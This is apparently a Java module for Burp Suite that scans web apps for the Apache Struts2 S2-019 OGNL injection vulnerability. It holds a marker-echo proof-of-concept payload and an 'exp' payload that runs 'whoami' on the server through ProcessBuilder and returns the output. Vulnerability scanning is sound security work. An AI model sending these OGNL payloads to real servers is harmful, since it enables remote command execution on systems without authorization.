package module.java.vul;

import burp.*;
import module.Util;

import java.net.URLEncoder;
import java.util.Arrays;

public class S2_019 extends IModule {
    public String randomMark = Util.getRandomString(16);
    public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};

    public String poc =
            "debug=command&expression=" +
            "#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter()," +
            "#out.print('" + injectMark[0] + "')," +
            "#out.print('" + injectMark[1] + "')," +
            "#out.flush()," +
            "#out.close()";
    public String exp =
        "debug=command&expression=" +
        "#a=(new java.lang.ProcessBuilder('whoami')).start()," +
        "#b=#a.getInputStream()," +
        "#c=new java.io.InputStreamReader(#b)," +
        "#d=new java.io.BufferedReader(#c)," +
        "#e=new char[50]," +
        "#d.read(#e)," +
        "#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter()," +
        "#out.print(new java.lang.String(#e))," +
        "#out.flush()," +
        "#out.close()";

    @Override
    public IScanIssue start() {
        IHttpService httpService = iHttpRequestResponse.getHttpService();
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
        byte[] request = iHttpRequestResponse.getRequest();

        byte in = (byte) 0;
        if (requestInfo.getMethod().equals("POST")) {
            in = (byte) 1;
        }

        String[] parameters = poc.split("&");
        byte[] newRequest = request;
        for (String parameter: parameters) {
            String[] tmp = parameter.split("=", 2);
            String parameterName = tmp[0];
            String parameterValue = tmp[1];
            IParameter newParameter = helpers.buildParameter(parameterName, URLEncoder.encode(parameterValue), in);
            newRequest = helpers.updateParameter(newRequest, newParameter);
        }
        IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
        byte[] response = newHttpRequestResponse.getResponse();
        IResponseInfo newResponseInfo = helpers.analyzeResponse(response);
        byte[] body = Arrays.copyOfRange(response, newResponseInfo.getBodyOffset(), response.length);
        String bodyText = new String(body);
        if (bodyText.contains(randomMark)) {
            this.iHttpRequestResponse = newHttpRequestResponse;
            this.detail = URLEncoder.encode(exp).replace("%3D", "=").replace("%26", "&");
            return creatCustomScanIssue();
        }

        return null;
    }
}
